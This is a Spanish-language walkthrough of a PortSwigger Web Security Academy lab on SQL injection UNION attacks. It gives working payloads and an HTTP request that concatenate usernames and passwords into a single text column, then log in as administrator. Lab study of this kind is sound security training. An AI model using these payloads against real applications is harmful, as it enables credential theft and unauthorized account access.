# Lab 04 — SQL injection UNION attack, retrieving multiple values in a single column

> Fuente principal: solución oficial de PortSwigger Web Security Academy.

## Objetivo exacto

Extraer usernames y passwords desde `users` cuando solamente **una** de las columnas del resultado es compatible con texto. Concatenar ambos valores dentro de esa única columna y usar las credenciales de `administrator` para iniciar sesión.

URL oficial:

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

---

# Qué enseña este lab

A veces sabemos que la consulta tiene dos columnas pero solamente una puede mostrar texto.

Entonces esto no sirve:

```sql
UNION SELECT username,password FROM users
```

porque una de las posiciones no acepta strings.

La solución es **combinar username y password en una sola expresión textual**.

---

# Procedimiento oficial paso a paso

## Paso 1 — Capturar el filtro

Intercepta la request del filtro de categoría y localiza `category`.

## Paso 2 — Verificar estructura

PortSwigger indica verificar que existen **2 columnas y solo la segunda acepta texto** con:

```text
'+UNION+SELECT+NULL,'abc'--
```

La primera posición queda como `NULL` y la segunda muestra texto.

## Paso 3 — Concatenar username y password

Usa el payload oficial:

```text
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

El operador:

```text
||
```

concatena strings en el DBMS usado por el lab.

El separador:

```text
~
```

solo sirve para distinguir visualmente los dos valores.

## Paso 4 — Leer resultados

La Response mostrará valores conceptualmente parecidos a:

```text
administrator~s3cretPassword
carlos~otroPassword
```

Busca la fila de `administrator`.

## Paso 5 — Login

Ve a **My account** e inicia sesión con:

```text
username: administrator
password: <password extraído>
```

El lab debe quedar **Solved**.

---

# Request clave

```http
GET /filter?category='+UNION+SELECT+NULL,username||'~'||password+FROM+users-- HTTP/2
```

Semánticamente:

```sql
' UNION SELECT NULL, username || '~' || password FROM users--
```

---

# Por qué funciona

La consulta inyectada necesita dos columnas porque la original tiene dos, pero solo una puede transportar strings.

Entonces hacemos:

```text
columna 1 → NULL
columna 2 → username + '~' + password
```

Así respetamos la estructura y metemos dos valores lógicos dentro de una sola columna física.

---

# Diferencia con el lab anterior

```text
Lab 03:
2 columnas de texto
→ username | password

Lab 04:
solo 1 columna de texto
→ NULL | username~password
```

Esta diferencia es muy importante para SQLi real.

---

# Burp que tengo que aprender

- identificar que una columna no acepta texto;
- adaptar el `UNION` en vez de abandonar la técnica;
- concatenar valores;
- elegir un separador visual reconocible;
- extraer credenciales de una respuesta mezclada con contenido normal.

---

# Checklist

- [ ] Confirmé que hay 2 columnas.
- [ ] Confirmé que solo la segunda admite texto.
- [ ] Usé `username||'~'||password`.
- [ ] Vi credenciales concatenadas en la Response.
- [ ] Encontré el password de administrator.
- [ ] Inicié sesión.
- [ ] Lab Solved.

# Regla para recordar

```text
Si solo una columna puede mostrar texto,
puedo empaquetar varios valores dentro de ella mediante concatenación.
```
